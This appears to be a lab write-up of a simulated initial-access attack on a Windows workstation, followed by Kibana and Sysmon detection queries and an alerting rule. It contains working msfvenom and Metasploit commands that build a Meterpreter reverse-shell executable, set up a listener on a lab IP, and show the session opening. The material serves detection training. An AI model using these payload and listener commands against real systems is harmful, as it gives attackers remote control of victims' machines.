# Initial Access Phase Analysis

## Objective
Establish an initial foothold on a target Windows workstation (WS1) by generating a reverse shell payload, transferring it, and executing it to obtain a Meterpreter session. The attack simulates a user downloading and running a malicious executable (e.g., via phishing or drive-by download).

---

## Attack Execution

### 1. Payload Generation (Kali Linux)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
```

- Payload: windows/meterpreter/reverse_tcp  
- LHOST: 192.168.1.5 (Kali attacker IP)  
- LPORT: 4444 (listening port)  
- Output: /tmp/shell.exe  

The generated executable is a Windows PE file that initiates a reverse TCP connection to the attacker.

---

### 2. Listener Setup (Metasploit)

```bash
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

The handler runs in the background and waits for incoming connections.

---

### 3. Payload Execution on Target

The payload (`shell.exe`) was executed on a domain-joined Windows workstation:

- IP: 192.168.1.40  
- Hostname: WS3  
- User context: Standard domain user  

---

### 4. Session Established

```
[*] Sending stage (199238 bytes) to 192.168.1.40
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.40:49627)
```

A Meterpreter session was successfully established, providing remote control over the system.

---

## Detection in Kibana (Winlogbeat / Sysmon)

| Event ID | Source | Description | Detection Query |
|----------|--------|-------------|------------------|
| 4688 | Windows Security | Process creation of shell.exe | winlog.event_id: 4688 AND process.executable: *shell.exe |
| 1 | Sysmon | Detailed process creation | event.code: 1 AND process.executable: *shell.exe |
| 3 | Sysmon | Network connection to attacker | event.code: 3 AND destination.ip: 192.168.1.5 AND destination.port: 4444 |
| 4624 | Windows Security | Successful logon (if applicable) | winlog.event_id: 4624 AND winlog.event_data.LogonType: 2 |

---

## Recommended Kibana Alerting Rule

- **Rule Name:** Initial Access – Reverse Shell Execution  
- **Index Pattern:** winlogbeat-*  
- **KQL Query:**  
  ```
  winlog.event_id: 4688 AND process.executable: *shell.exe
  ```
- **Schedule:** Every 5 minutes  
- **Threshold:** Count > 0  
- **Action:** Alert / Log / Webhook  

---

## Screenshot Evidence

- `msfvenom-generation.png` – payload creation  
- `msfconsole-listener.png` – Metasploit session  
- `kibana-4688-event.png` – process execution logs  

---

## Conclusion

The initial access phase successfully compromised a Windows workstation using a reverse shell payload. All activity was logged via Windows Security and Sysmon, enabling detection through Kibana.

This demonstrates how endpoint telemetry can identify malicious process execution and outbound C2 connections in real time.

---

## Note

In this simulation, the payload was executed on WS3 (192.168.1.40). The same technique applies to WS1 (192.168.1.20) in the broader attack chain.